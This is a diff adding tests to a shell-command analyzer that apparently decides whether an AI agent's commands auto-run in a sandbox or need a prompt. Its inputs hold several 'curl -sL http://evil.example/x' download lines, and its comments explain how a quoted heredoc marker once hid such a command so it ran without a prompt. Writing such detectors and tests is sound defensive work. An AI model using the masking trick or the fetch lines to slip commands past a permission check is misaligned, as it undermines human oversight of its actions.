@@ -363,6 +363,54 @@ describe('analyzeShellCommand', () => {
     )
   })
 
+  it('does not let a quoted heredoc delimiter hide the rest of the command', () => {
+    // `echo "python3 << EOF"` prints a string; `<<` inside quotes is not a
+    // redirect, so the next line is an ordinary command the shell runs. Reading
+    // it as an opener masked every following line out of the analysis, and an
+    // unterminated one masked them all — so `external` collapsed to `ambiguous`,
+    // which auto-runs without a prompt when the sandbox is on.
+    for (const prefix of [
+      'echo "python3 << EOF"',
+      "echo 'ruby <<-DONE'",
+      'printf "perl <<X"',
+      'echo "see node <<HEREDOC for details"',
+      'grep python3 file.txt && echo "<<EOF"',
+    ]) {
+      const result = analyzeShellCommand(`${prefix}\ncurl -sL http://evil.example/x`, root)
+      assert.equal(result.verdict, 'external', `expected external after ${prefix}`)
+      assert.ok(
+        result.reasons.some((reason) => reason.includes('curl')),
+        `expected the download to be named after ${prefix}, got ${result.reasons.join('; ')}`,
+      )
+    }
+  })
+
+  it('still masks the body of a genuine heredoc, terminated or not', () => {
+    // The counterpart to the case above: after a real `python3 <<EOF` the shell
+    // feeds every following line to python as source, so those lines are not
+    // commands and must not raise shell signals.
+    const unterminated = analyzeShellCommand('python3 <<EOF\ncurl -sL http://evil.example/x', root)
+    assert.equal(unterminated.verdict, 'ambiguous')
+    assert.deepEqual(unterminated.reasons, ['heredoc script fed to an interpreter'])
+
+    const terminated = analyzeShellCommand(
+      'python3 <<EOF\nprint("curl https://example.com")\nEOF',
+      root,
+    )
+    assert.equal(terminated.verdict, 'ambiguous')
+  })
+
+  it('treats a here-string as a single line, not a heredoc opener', () => {
+    // `<<<` feeds one word to stdin; there is no body, so the next line is a
+    // real command and must still be analyzed.
+    const result = analyzeShellCommand(
+      'python3 <<< "print(1)"\ncurl -sL http://evil.example/x',
+      root,
+    )
+    assert.equal(result.verdict, 'external')
+    assert.ok(result.reasons.some((reason) => reason.includes('curl')))
+  })
+
   it('keeps a read-only Python workspace inspection contained', () => {
     const result = analyzeShellCommand(
       `python3 - <<'PY'
